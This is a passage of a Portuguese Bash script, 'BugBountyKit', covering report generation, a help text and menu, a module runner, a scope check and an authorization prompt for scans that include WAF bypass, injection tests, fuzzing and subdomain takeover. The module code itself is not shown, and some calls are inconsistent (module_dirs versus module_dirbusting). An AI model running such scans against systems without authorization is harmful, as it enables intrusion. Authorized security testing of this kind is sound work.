    [[ -z "$dirs_html" ]] && dirs_html="<li><em>Nenhum endpoint encontrado</em></li>"

    # Portas para HTML
    local ports_html=""
    if [[ -f "${tdir}/ports/services.txt" ]]; then
        while IFS= read -r line; do
            [[ -z "$line" ]] && continue
            ports_html+="<li><code>${line}</code></li>"
        done < "${tdir}/ports/services.txt"
    fi
    [[ -z "$ports_html" ]] && ports_html="<li><em>Nenhuma porta aberta registrada</em></li>"

    # Tech stack para HTML
    local tech_html=""
    if [[ -f "${tdir}/recon/tech_stack.txt" ]]; then
        while IFS= read -r line; do
            [[ -z "$line" ]] || [[ "$line" =~ ^=== ]] && continue
            tech_html+="<li><code>${line}</code></li>"
        done < "${tdir}/recon/tech_stack.txt"
    fi
    [[ -z "$tech_html" ]] && tech_html="<li><em>Não identificado</em></li>"

    cat > "$report_html" << HTML_EOF
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BugBountyKit v${VERSION} — ${DOMAIN}</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans:wght@300;400;600;700&display=swap');
  :root {
    --bg: #0d1117; --bg2: #161b22; --bg3: #21262d;
    --border: #30363d; --text: #e6edf3; --muted: #8b949e;
    --accent: #58a6ff; --green: #3fb950; --red: #f85149;
    --orange: #f0883e; --yellow: #d29922; --blue: #388bfd;
    --critical: #dc2626; --high: #ea580c;
    --medium: #ca8a04; --low: #2563eb; --info: #6b7280;
    --font: 'IBM Plex Sans', sans-serif;
    --mono: 'IBM Plex Mono', monospace;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: var(--bg); color: var(--text); font-family: var(--font); font-size: 14px; line-height: 1.6; }
  .container { max-width: 1200px; margin: 0 auto; padding: 24px; }

  /* Header */
  .header { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 20px 24px; margin-bottom: 24px; display: flex; align-items: center; justify-content: space-between; border-radius: 8px; }
  .header-title { font-size: 20px; font-weight: 700; font-family: var(--mono); color: var(--accent); }
  .header-meta { font-size: 12px; color: var(--muted); text-align: right; }
  .header-meta strong { color: var(--text); }

  /* Severity Cards */
  .sev-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; margin-bottom: 24px; }
  .sev-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 16px; text-align: center; position: relative; overflow: hidden; }
  .sev-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; }
  .sev-card.critical::before { background: var(--critical); }
  .sev-card.high::before    { background: var(--high); }
  .sev-card.medium::before  { background: var(--medium); }
  .sev-card.low::before     { background: var(--low); }
  .sev-card.info::before    { background: var(--info); }
  .sev-count { font-size: 32px; font-weight: 700; font-family: var(--mono); }
  .sev-card.critical .sev-count { color: var(--critical); }
  .sev-card.high .sev-count    { color: var(--high); }
  .sev-card.medium .sev-count  { color: var(--medium); }
  .sev-card.low .sev-count     { color: var(--low); }
  .sev-card.info .sev-count    { color: var(--info); }
  .sev-label { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: var(--muted); margin-top: 4px; }

  /* Section */
  .section { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; margin-bottom: 16px; overflow: hidden; }
  .section-header { padding: 14px 18px; cursor: pointer; display: flex; align-items: center; justify-content: space-between; user-select: none; border-bottom: 1px solid var(--border); }
  .section-header:hover { background: var(--bg3); }
  .section-title { font-weight: 600; font-size: 14px; display: flex; align-items: center; gap: 8px; }
  .section-icon { font-size: 16px; }
  .section-badge { background: var(--bg3); border: 1px solid var(--border); border-radius: 12px; padding: 2px 8px; font-size: 11px; color: var(--muted); font-family: var(--mono); }
  .section-content { padding: 18px; display: block; }
  .section-content.collapsed { display: none; }
  .toggle-arrow { color: var(--muted); transition: transform 0.2s; }
  .toggle-arrow.open { transform: rotate(90deg); }

  /* Table */
  table { width: 100%; border-collapse: collapse; font-size: 13px; }
  th { background: var(--bg3); padding: 10px 12px; text-align: left; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--muted); border-bottom: 1px solid var(--border); }
  td { padding: 10px 12px; border-bottom: 1px solid var(--border); vertical-align: top; }
  tr:last-child td { border-bottom: none; }
  tr:hover td { background: var(--bg3); }
  .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 600; font-family: var(--mono); color: white; }

  /* Filter Buttons */
  .filter-row { display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap; }
  .filter-btn { padding: 6px 14px; border-radius: 6px; border: 1px solid var(--border); background: var(--bg3); color: var(--text); cursor: pointer; font-size: 12px; font-family: var(--font); transition: all 0.15s; }
  .filter-btn:hover, .filter-btn.active { border-color: var(--accent); color: var(--accent); }

  /* Lists */
  ul.findings-list { list-style: none; }
  ul.findings-list li { padding: 8px 0; border-bottom: 1px solid var(--border); font-family: var(--mono); font-size: 12px; color: var(--text); }
  ul.findings-list li:last-child { border-bottom: none; }
  ul.findings-list li::before { content: '→ '; color: var(--accent); }

  /* Code */
  code { background: var(--bg3); border: 1px solid var(--border); border-radius: 4px; padding: 1px 6px; font-family: var(--mono); font-size: 12px; color: var(--green); }

  /* Search */
  .search-box { width: 100%; padding: 10px 14px; background: var(--bg3); border: 1px solid var(--border); border-radius: 6px; color: var(--text); font-family: var(--font); font-size: 13px; margin-bottom: 16px; outline: none; }
  .search-box:focus { border-color: var(--accent); }

  /* Warning Banner */
  .legal-warn { background: rgba(248,81,73,0.1); border: 1px solid var(--red); border-radius: 8px; padding: 12px 16px; margin-bottom: 24px; font-size: 12px; color: var(--red); display: flex; align-items: center; gap: 8px; }

  /* Scrollbar */
  ::-webkit-scrollbar { width: 6px; height: 6px; }
  ::-webkit-scrollbar-track { background: var(--bg); }
  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }

  @media (max-width: 768px) {
    .sev-grid { grid-template-columns: repeat(3, 1fr); }
    .container { padding: 12px; }
  }
</style>
</head>
<body>
<div class="container">

  <!-- Header -->
  <div class="header">
    <div>
      <div class="header-title">🔐 BugBountyKit v${VERSION}</div>
      <div style="color:var(--muted);font-size:12px;margin-top:4px">Security Assessment Report</div>
    </div>
    <div class="header-meta">
      <div><strong>Alvo:</strong> ${DOMAIN}</div>
      <div><strong>IP:</strong> ${ip:-N/A}</div>
      <div><strong>Data:</strong> $(date '+%d/%m/%Y %H:%M')</div>
    </div>
  </div>

  <!-- Legal Warning -->
  <div class="legal-warn">
    ⚠️ <strong>CONFIDENCIAL:</strong> Este relatório contém informações de segurança sensíveis.
    Gerado exclusivamente para fins de pesquisa de segurança autorizada.
  </div>

  <!-- Severity Summary -->
  <div class="sev-grid">
    <div class="sev-card critical">
      <div class="sev-count">${SEVERITY_COUNT_CRITICAL}</div>
      <div class="sev-label">Critical</div>
    </div>
    <div class="sev-card high">
      <div class="sev-count">${SEVERITY_COUNT_HIGH}</div>
      <div class="sev-label">High</div>
    </div>
    <div class="sev-card medium">
      <div class="sev-count">${SEVERITY_COUNT_MEDIUM}</div>
      <div class="sev-label">Medium</div>
    </div>
    <div class="sev-card low">
      <div class="sev-count">${SEVERITY_COUNT_LOW}</div>
      <div class="sev-label">Low</div>
    </div>
    <div class="sev-card info">
      <div class="sev-count">${SEVERITY_COUNT_INFO}</div>
      <div class="sev-label">Info</div>
    </div>
  </div>

  <!-- Findings Table -->
  <div class="section">
    <div class="section-header" onclick="toggleSection(this)">
      <div class="section-title"><span class="section-icon">🎯</span> Findings de Segurança <span class="section-badge" id="findings-count">$(( SEVERITY_COUNT_CRITICAL + SEVERITY_COUNT_HIGH + SEVERITY_COUNT_MEDIUM + SEVERITY_COUNT_LOW + SEVERITY_COUNT_INFO )) total</span></div>
      <span class="toggle-arrow open">▶</span>
    </div>
    <div class="section-content">
      <input class="search-box" type="text" id="findingsSearch" placeholder="🔍 Filtrar findings..." oninput="filterFindings()">
      <div class="filter-row">
        <button class="filter-btn active" onclick="filterBySev('ALL', this)">Todos</button>
        <button class="filter-btn" onclick="filterBySev('CRITICAL', this)" style="border-color:#dc2626">🔴 Critical</button>
        <button class="filter-btn" onclick="filterBySev('HIGH', this)" style="border-color:#ea580c">🟠 High</button>
        <button class="filter-btn" onclick="filterBySev('MEDIUM', this)" style="border-color:#ca8a04">🟡 Medium</button>
        <button class="filter-btn" onclick="filterBySev('LOW', this)" style="border-color:#2563eb">🔵 Low</button>
        <button class="filter-btn" onclick="filterBySev('INFO', this)">⚪ Info</button>
      </div>
      <table id="findingsTable">
        <thead><tr><th>Severidade</th><th>Título</th><th>Descrição</th><th>Módulo</th></tr></thead>
        <tbody>
${findings_html}
        </tbody>
      </table>
    </div>
  </div>

  <!-- Subdomains -->
  <div class="section">
    <div class="section-header" onclick="toggleSection(this)">
      <div class="section-title"><span class="section-icon">🌐</span> Subdomínios Ativos</div>
      <span class="toggle-arrow">▶</span>
    </div>
    <div class="section-content collapsed">
      <ul class="findings-list">
${subs_html}
      </ul>
    </div>
  </div>

  <!-- Directories -->
  <div class="section">
    <div class="section-header" onclick="toggleSection(this)">
      <div class="section-title"><span class="section-icon">📁</span> Endpoints Descobertos</div>
      <span class="toggle-arrow">▶</span>
    </div>
    <div class="section-content collapsed">
      <ul class="findings-list">
${dirs_html}
      </ul>
    </div>
  </div>

  <!-- Ports -->
  <div class="section">
    <div class="section-header" onclick="toggleSection(this)">
      <div class="section-title"><span class="section-icon">🔌</span> Portas Abertas</div>
      <span class="toggle-arrow">▶</span>
    </div>
    <div class="section-content collapsed">
      <ul class="findings-list">
${ports_html}
      </ul>
    </div>
  </div>

  <!-- Tech Stack -->
  <div class="section">
    <div class="section-header" onclick="toggleSection(this)">
      <div class="section-title"><span class="section-icon">⚙️</span> Technology Stack</div>
      <span class="toggle-arrow">▶</span>
    </div>
    <div class="section-content collapsed">
      <ul class="findings-list">
${tech_html}
      </ul>
    </div>
  </div>

  <!-- Recommendations -->
  <div class="section">
    <div class="section-header" onclick="toggleSection(this)">
      <div class="section-title"><span class="section-icon">💡</span> Recomendações</div>
      <span class="toggle-arrow">▶</span>
    </div>
    <div class="section-content collapsed">
      <ol style="padding-left:20px;line-height:2">
        <li>Corrigir imediatamente todas as vulnerabilidades <span class="badge" style="background:#dc2626">CRITICAL</span> e <span class="badge" style="background:#ea580c">HIGH</span></li>
        <li>Implementar Security Headers: CSP, HSTS, X-Frame-Options, X-Content-Type-Options</li>
        <li>Configurar email authentication: SPF com <code>-all</code>, DMARC <code>p=reject</code>, DKIM</li>
        <li>Revisar e restringir acesso a buckets cloud (S3, Azure Blob, GCS)</li>
        <li>Remover headers de versão do servidor (Server:, X-Powered-By:)</li>
        <li>Implementar rate limiting e CAPTCHA em endpoints de autenticação</li>
        <li>Auditar segredos e API keys em JavaScript e arquivos de configuração</li>
        <li>Atualizar todas as dependências com CVEs conhecidos</li>
        <li>Configurar WAF com regras OWASP Core Rule Set</li>
        <li>Revisar configurações de CORS, cookies (HttpOnly, Secure, SameSite)</li>
      </ol>
    </div>
  </div>

  <div style="text-align:center;color:var(--muted);font-size:11px;margin-top:24px;padding:16px;border-top:1px solid var(--border)">
    ${SCRIPT_NAME} v${VERSION} — Bug Bounty Security Assessment Tool — $(date '+%Y')<br>
    Uso autorizado apenas em alvos com permissão explícita por escrito<br>
    LGPD (Lei 13.709/2018) | Marco Civil da Internet (Lei 12.965/2014)
  </div>

</div>

<script>
function toggleSection(header) {
  const content = header.nextElementSibling;
  const arrow = header.querySelector('.toggle-arrow');
  content.classList.toggle('collapsed');
  arrow.classList.toggle('open');
}

function filterBySev(sev, btn) {
  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  const rows = document.querySelectorAll('#findingsTable tbody tr');
  rows.forEach(row => {
    if (sev === 'ALL') { row.style.display = ''; return; }
    const badge = row.querySelector('.badge');
    row.style.display = badge && badge.textContent === sev ? '' : 'none';
  });
}

function filterFindings() {
  const q = document.getElementById('findingsSearch').value.toLowerCase();
  document.querySelectorAll('#findingsTable tbody tr').forEach(row => {
    row.style.display = row.textContent.toLowerCase().includes(q) ? '' : 'none';
  });
}

// Keyboard shortcut: Ctrl+F focuses search
document.addEventListener('keydown', e => {
  if (e.ctrlKey && e.key === 'f') {
    e.preventDefault();
    document.getElementById('findingsSearch').focus();
  }
});
</script>
</body>
</html>
HTML_EOF

    log_find "Relatório HTML interativo: ${report_html}"

    # ── RELATÓRIO JSON ──────────────────────────────────────────────
    {
    echo "{"
    echo "  \"meta\": {"
    echo "    \"tool\": \"${SCRIPT_NAME}\","
    echo "    \"version\": \"${VERSION}\","
    echo "    \"target\": \"${DOMAIN}\","
    echo "    \"ip\": \"${ip:-null}\","
    echo "    \"date\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\""
    echo "  },"
    echo "  \"severity_summary\": {"
    echo "    \"critical\": ${SEVERITY_COUNT_CRITICAL},"
    echo "    \"high\": ${SEVERITY_COUNT_HIGH},"
    echo "    \"medium\": ${SEVERITY_COUNT_MEDIUM},"
    echo "    \"low\": ${SEVERITY_COUNT_LOW},"
    echo "    \"info\": ${SEVERITY_COUNT_INFO}"
    echo "  },"
    echo "  \"findings\": ["
    local first=true
    for finding in "${FINDINGS_LIST[@]}"; do
        IFS='|||' read -r sev title desc mod <<< "$finding"
        [[ "$first" == "true" ]] && first=false || echo ","
        # Escape double quotes in strings
        local title_esc; title_esc="${title//\"/\\\"}"
        local desc_esc;  desc_esc="${desc//\"/\\\"}"
        printf '    {"severity":"%s","title":"%s","description":"%s","module":"%s"}' \
            "$sev" "$title_esc" "$desc_esc" "$mod"
    done
    echo ""
    echo "  ]"
    echo "}"
    } > "$report_json"

    log_find "Relatório JSON: ${report_json}"

    # ── RESUMO FINAL NA TELA ────────────────────────────────────────
    local total_findings=$(( SEVERITY_COUNT_CRITICAL + SEVERITY_COUNT_HIGH + \
                             SEVERITY_COUNT_MEDIUM + SEVERITY_COUNT_LOW + SEVERITY_COUNT_INFO ))

    echo ""
    echo -e "${CYAN}${BOLD}  ╔══════════════════════════════════════════════════╗${RESET}"
    echo -e "${CYAN}${BOLD}  ║          RESUMO FINAL — ${DOMAIN}${RESET}"
    echo -e "${CYAN}${BOLD}  ╠══════════════════════════════════════════════════╣${RESET}"
    echo -e "  ║  ${LRED}CRITICAL${RESET}  : ${BOLD}${SEVERITY_COUNT_CRITICAL}${RESET}"
    echo -e "  ║  ${RED}HIGH${RESET}      : ${BOLD}${SEVERITY_COUNT_HIGH}${RESET}"
    echo -e "  ║  ${YELLOW}MEDIUM${RESET}    : ${BOLD}${SEVERITY_COUNT_MEDIUM}${RESET}"
    echo -e "  ║  ${BLUE}LOW${RESET}       : ${BOLD}${SEVERITY_COUNT_LOW}${RESET}"
    echo -e "  ║  ${GRAY}INFO${RESET}      : ${BOLD}${SEVERITY_COUNT_INFO}${RESET}"
    echo -e "  ║  ${WHITE}TOTAL${RESET}     : ${BOLD}${total_findings}${RESET}"
    echo -e "${CYAN}${BOLD}  ╠══════════════════════════════════════════════════╣${RESET}"
    echo -e "  ║  ${GREEN}HTML${RESET}    → ${DIM}${report_html}${RESET}"
    echo -e "  ║  ${GREEN}Markdown${RESET}→ ${DIM}${report_md}${RESET}"
    echo -e "  ║  ${GREEN}JSON${RESET}    → ${DIM}${report_json}${RESET}"
    echo -e "  ║  ${GREEN}Dados${RESET}   → ${DIM}${tdir}/${RESET}"
    echo -e "${CYAN}${BOLD}  ╚══════════════════════════════════════════════════╝${RESET}"
    echo ""
}

# ──────────────────────────────────────────────────────────────────────────────
# MENU INTERATIVO
# ──────────────────────────────────────────────────────────────────────────────
show_help() {
    echo -e "${WHITE}${BOLD}USO:${RESET}"
    echo -e "  ${CYAN}$0${RESET} [OPÇÕES] -t <alvo>"
    echo ""
    echo -e "${WHITE}${BOLD}OPÇÕES:${RESET}"
    echo -e "  ${GREEN}-t${RESET} <alvo>       Domínio ou URL alvo (obrigatório)"
    echo -e "  ${GREEN}-m${RESET} <módulos>    Módulos separados por vírgula (padrão: all)"
    echo -e "  ${GREEN}-o${RESET} <dir>        Diretório de saída (padrão: ./bbk_results)"
    echo -e "  ${GREEN}-T${RESET} <threads>    Número de threads (padrão: 10)"
    echo -e "  ${GREEN}-x${RESET} <segundos>   Timeout por requisição (padrão: 10)"
    echo -e "  ${GREEN}-r${RESET} <ms>         Rate limit em ms (padrão: 100)"
    echo -e "  ${GREEN}-s${RESET} <scope>      Arquivo de escopo"
    echo -e "  ${GREEN}-v${RESET}              Modo verbose (DEBUG)"
    echo -e "  ${GREEN}-h${RESET}              Mostrar esta ajuda"
    echo ""
    echo -e "${WHITE}${BOLD}MÓDULOS DISPONÍVEIS:${RESET}"
    echo -e "  ${YELLOW}whois${RESET}        Reconhecimento WHOIS / IP / ASN / Geolocalização"
    echo -e "  ${YELLOW}dns${RESET}          Enumeração DNS completa + Zone Transfer"
    echo -e "  ${YELLOW}email${RESET}        Email Security (SPF/DMARC/DKIM/MTA-STS/BIMI/DANE)"
    echo -e "  ${YELLOW}network${RESET}      Network Intel (Traceroute/IPv6/CDN/BGP/rDNS)"
    echo -e "  ${YELLOW}subdomains${RESET}   Enumeração de subdomínios (OSINT + brute-force)"
    echo -e "  ${YELLOW}takeover${RESET}     Subdomain Takeover (dangling CNAME / fingerprints)"
    echo -e "  ${YELLOW}ports${RESET}        Varredura de portas e serviços (nmap)"
    echo -e "  ${YELLOW}http${RESET}         Fingerprinting HTTP + Security Headers"
    echo -e "  ${YELLOW}tech${RESET}         Technology Stack Profiling (backend/frontend/DB)"
    echo -e "  ${YELLOW}waf${RESET}          WAF Fingerprint + Bypass Techniques"
    echo -e "  ${YELLOW}cms${RESET}          CMS Deep Scan (WordPress/Joomla/Drupal/Magento)"
    echo -e "  ${YELLOW}dirs${RESET}         Enumeração de diretórios e arquivos sensíveis"
    echo -e "  ${YELLOW}ssl${RESET}          Análise SSL/TLS / Cipher Suites / Certificados"
    echo -e "  ${YELLOW}secrets${RESET}      Scanner de segredos em JS/HTML (API keys, tokens)"
    echo -e "  ${YELLOW}vulns${RESET}        Testes de vulnerabilidades (XSS/SQLi/LFI/SSRF/SSTI)"
    echo -e "  ${YELLOW}fuzzing${RESET}      Parameter Fuzzing (IDOR/HPP/Rate Limit/Business Logic)"
    echo -e "  ${YELLOW}api${RESET}          Testes de API REST / GraphQL / Default Creds"
    echo -e "  ${YELLOW}cloud${RESET}        Cloud Exposure (S3/Azure/GCP/Firebase/DO Spaces)"
    echo -e "  ${YELLOW}osint${RESET}        OSINT (Wayback/Dorks/GitHub/Pastebin/Shodan)"
    echo -e "  ${YELLOW}cve${RESET}          CVE/Version Check (Apache/Nginx/PHP/WordPress)"
    echo -e "  ${YELLOW}all${RESET}          TODOS os 20 módulos"
    echo ""
    echo -e "${WHITE}${BOLD}EXEMPLOS:${RESET}"
    echo -e "  ${CYAN}$0 -t example.com${RESET}                            # Scan completo"
    echo -e "  ${CYAN}$0 -t example.com -m recon${RESET}                   # Recon passivo"
    echo -e "  ${CYAN}$0 -t example.com -m dns,subdomains,takeover${RESET} # Enumeração DNS"
    echo -e "  ${CYAN}$0 -t example.com -m secrets,cloud,vulns${RESET}     # Testes ofensivos"
    echo -e "  ${CYAN}$0 -t example.com -m cms,waf,cve -v${RESET}          # CMS/WAF verbose"
    echo ""
    echo -e "${LRED}${BOLD}AVISO LEGAL:${RESET} Use apenas em sistemas com autorização explícita!"
}

menu_interativo() {
    banner
    echo -e "  ${WHITE}${BOLD}[ MENU INTERATIVO — BugBountyKit v${VERSION} ]${RESET}"
    echo ""
    echo -e "  ${CYAN}${BOLD}─── SCANS COMPLETOS ───────────────────────────────${RESET}"
    echo -e "  ${CYAN} 1${RESET}) Scan Completo (todos os 20 módulos)"
    echo -e "  ${CYAN} 2${RESET}) Reconhecimento Passivo (WHOIS+DNS+Email+Network+OSINT)"
    echo -e "  ${CYAN} 3${RESET}) Enumeração Completa (Subdomínios+Takeover+Ports+Cloud)"
    echo -e ""
    echo -e "  ${CYAN}${BOLD}─── ANÁLISE WEB ───────────────────────────────────${RESET}"
    echo -e "  ${CYAN} 4${RESET}) Análise Web (HTTP+Tech+WAF+CMS+Dirs+SSL)"
    echo -e "  ${CYAN} 5${RESET}) Testes de Vulnerabilidades (XSS+SQLi+LFI+SSRF+SSTI)"
    echo -e "  ${CYAN} 6${RESET}) Parameter Fuzzing Avançado (IDOR+HPP+RateLimit+BizLogic)"
    echo -e "  ${CYAN} 7${RESET}) Scanner de Segredos (API keys+Tokens em JS/HTML)"
    echo -e ""
    echo -e "  ${CYAN}${BOLD}─── MÓDULOS ESPECÍFICOS ───────────────────────────${RESET}"
    echo -e "  ${CYAN} 8${RESET}) Varredura de Portas (nmap)"
    echo -e "  ${CYAN} 9${RESET}) Testes de API REST/GraphQL"
    echo -e "  ${CYAN}10${RESET}) Cloud Exposure (S3/Azure/GCP/Firebase)"
    echo -e "  ${CYAN}11${RESET}) CMS Deep Scan (WordPress/Joomla/Drupal/Magento)"
    echo -e "  ${CYAN}12${RESET}) WAF Fingerprint + Bypass Techniques"
    echo -e "  ${CYAN}13${RESET}) Email Security (SPF/DMARC/DKIM/MTA-STS/BIMI)"
    echo -e "  ${CYAN}14${RESET}) CVE / Version Check"
    echo -e "  ${CYAN}15${RESET}) Subdomain Takeover"
    echo -e "  ${CYAN}16${RESET}) Módulo customizado (escolher manualmente)"
    echo -e "  ${CYAN} 0${RESET}) Sair"
    echo ""

    read -rp "  $(echo -e "${WHITE}Escolha: ${RESET}")" choice

    local selected_modules=""
    case "$choice" in
        1)  selected_modules="all" ;;
        2)  selected_modules="whois,dns,email,network,osint" ;;
        3)  selected_modules="whois,dns,subdomains,takeover,ports,cloud" ;;
        4)  selected_modules="http,tech,waf,cms,dirs,ssl" ;;
        5)  selected_modules="vulns" ;;
        6)  selected_modules="fuzzing" ;;
        7)  selected_modules="secrets" ;;
        8)  selected_modules="ports" ;;
        9)  selected_modules="api" ;;
        10) selected_modules="cloud" ;;
        11) selected_modules="cms" ;;
        12) selected_modules="waf" ;;
        13) selected_modules="email" ;;
        14) selected_modules="cve" ;;
        15) selected_modules="takeover" ;;
        16)
            echo -e "\n  ${YELLOW}Módulos: whois dns email network subdomains takeover ports http tech waf cms dirs ssl secrets vulns fuzzing api cloud osint cve${RESET}"
            read -rp "  Digite os módulos (vírgula): " selected_modules
            ;;
        0) echo -e "\n  ${GRAY}Saindo...${RESET}\n"; exit 0 ;;
        *) echo -e "  ${LRED}Opção inválida${RESET}"; exit 1 ;;
    esac

    echo ""
    read -rp "  $(echo -e "${WHITE}Domínio/URL alvo: ${RESET}")" target_input

    if [[ -z "$target_input" ]]; then
        echo -e "  ${LRED}Erro: informe um alvo${RESET}"
        exit 1
    fi

    TARGET="$target_input"
    MODULES="$selected_modules"
}

# ──────────────────────────────────────────────────────────────────────────────
# VERIFICAR ESCOPO
# ──────────────────────────────────────────────────────────────────────────────
check_scope() {
    if [[ -z "$SCOPE_FILE" ]]; then return 0; fi
    if [[ ! -f "$SCOPE_FILE" ]]; then
        log_warn "Arquivo de escopo não encontrado: $SCOPE_FILE"
        return 0
    fi
    if grep -qF "$DOMAIN" "$SCOPE_FILE" 2>/dev/null; then
        log_info "Alvo dentro do escopo ✓"
        return 0
    else
        log_error "Alvo ${DOMAIN} NÃO está no escopo definido em ${SCOPE_FILE}"
        exit 1
    fi
}

# ──────────────────────────────────────────────────────────────────────────────
# RUNNER PRINCIPAL
# ──────────────────────────────────────────────────────────────────────────────
run_modules() {
    local modules="$1"

    # Preparar diretório de saída
    mkdir -p "$OUTDIR"
    local tdir; tdir="$(mk_outdir)"
    log_info "Resultados em: ${WHITE}${tdir}${RESET}"

    # Timer
    local start_time; start_time="$(date +%s)"

    # Executar módulos selecionados
    local mod_list
    IFS=',' read -ra mod_list <<< "$modules"

    for mod in "${mod_list[@]}"; do
        mod="$(echo "$mod" | xargs)"  # trim
        case "$mod" in
            whois)       module_whois            "$tdir" ;;
            dns)         module_dns              "$tdir" ;;
            subdomains)  module_subdomains       "$tdir" ;;
            ports)       module_ports            "$tdir" ;;
            http)        module_http_fingerprint "$tdir" ;;
            dirs)        module_dirbusting       "$tdir" ;;
            ssl)         module_ssl              "$tdir" ;;
            vulns)       module_web_vulns        "$tdir" ;;
            osint)       module_osint            "$tdir" ;;
            api)         module_api_tests        "$tdir" ;;
            takeover)    module_takeover         "$tdir" ;;
            cloud)       module_cloud            "$tdir" ;;
            secrets)     module_secrets          "$tdir" ;;
            waf)         module_waf              "$tdir" ;;
            cms)         module_cms              "$tdir" ;;
            network)     module_network          "$tdir" ;;
            fuzzing)     module_fuzzing          "$tdir" ;;
            email)       module_email_sec        "$tdir" ;;
            tech)        module_tech_profile     "$tdir" ;;
            cve)         module_cve_check        "$tdir" ;;
            all)
                module_whois            "$tdir"
                module_dns              "$tdir"
                module_email_sec        "$tdir"
                module_network          "$tdir"
                module_subdomains       "$tdir"
                module_takeover         "$tdir"
                module_ports            "$tdir"
                module_http_fingerprint "$tdir"
                module_tech_profile     "$tdir"
                module_waf              "$tdir"
                module_cms              "$tdir"
                module_dirs             "$tdir"
                module_ssl              "$tdir"
                module_secrets          "$tdir"
                module_web_vulns        "$tdir"
                module_fuzzing          "$tdir"
                module_api_tests        "$tdir"
                module_cloud            "$tdir"
                module_osint            "$tdir"
                module_cve_check        "$tdir"
                ;;
            *) log_warn "Módulo desconhecido: $mod" ;;
        esac
    done

    # Gerar relatório
    module_report "$tdir"

    # Tempo total
    local end_time; end_time="$(date +%s)"
    local elapsed=$(( end_time - start_time ))
    local mins=$(( elapsed / 60 ))
    local secs=$(( elapsed % 60 ))
    log_info "Tempo total: ${mins}m ${secs}s"
}

# ──────────────────────────────────────────────────────────────────────────────
# PARSE DE ARGUMENTOS
# ──────────────────────────────────────────────────────────────────────────────
MODULES="all"
INTERACTIVE=false

if [[ $# -eq 0 ]]; then
    INTERACTIVE=true
fi

while getopts "t:m:o:T:r:s:vhI" opt; do
    case "$opt" in
        t) TARGET="$OPTARG" ;;
        m) MODULES="$OPTARG" ;;
        o) OUTDIR="$OPTARG" ;;
        T) THREADS="$OPTARG" ;;
        r) RATE_LIMIT="$OPTARG" ;;
        s) SCOPE_FILE="$OPTARG" ;;
        v) LOGLEVEL="DEBUG" ;;
        I) INTERACTIVE=true ;;
        h) banner; show_help; exit 0 ;;
        *) show_help; exit 1 ;;
    esac
done

# ──────────────────────────────────────────────────────────────────────────────
# PONTO DE ENTRADA
# ──────────────────────────────────────────────────────────────────────────────
banner

if [[ "$INTERACTIVE" == "true" ]]; then
    menu_interativo
fi

if [[ -z "$TARGET" ]]; then
    log_error "Informe um alvo com -t <domínio>"
    show_help
    exit 1
fi

# Normalizar alvo
DOMAIN="$(extract_domain "$TARGET")"
if [[ -z "$DOMAIN" ]]; then
    log_error "Alvo inválido: $TARGET"
    exit 1
fi

log_info "Iniciando BugBountyKit v${VERSION}"
log_info "Alvo     : ${WHITE}${DOMAIN}${RESET}"
log_info "Módulos  : ${WHITE}${MODULES}${RESET}"
log_info "Threads  : ${WHITE}${THREADS}${RESET}"
log_info "Timeout  : ${WHITE}${TIMEOUT}s${RESET}"
log_info "Rate     : ${WHITE}${RATE_LIMIT}ms${RESET}"

# Aviso legal obrigatório
echo ""
echo -e "${LRED}${BOLD}  ⚠  AVISO LEGAL  ⚠${RESET}"
echo -e "  ${WHITE}Esta ferramenta deve ser usada APENAS em alvos com${RESET}"
echo -e "  ${WHITE}autorização EXPLÍCITA E POR ESCRITO do proprietário.${RESET}"
echo -e "  ${WHITE}O uso não autorizado é crime (Lei 12.737/2012).${RESET}"
echo ""
read -rp "  $(echo -e "${YELLOW}Confirmo que tenho autorização. Continuar? (s/N): ${RESET}")" confirm
if [[ ! "$confirm" =~ ^[sS]$ ]]; then
    echo -e "\n  ${GRAY}Abortado.${RESET}\n"
    exit 0
fi
echo ""

check_scope
run_modules "$MODULES"
